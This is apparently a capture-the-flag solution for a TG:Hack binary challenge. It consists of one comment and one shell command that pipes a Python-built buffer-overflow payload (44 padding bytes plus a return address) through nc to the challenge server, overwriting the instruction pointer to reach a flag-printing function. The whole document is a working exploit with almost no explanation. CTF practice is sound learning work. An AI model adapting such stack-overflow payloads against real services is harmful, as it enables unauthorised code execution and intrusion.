# Overwrite the eip(instruction pointer) with the address of the function that prints the flag
python -c 'print "A" * 44 + "\xb6\x86\x04\x08"' | nc pwntion3.tghack.no 1063
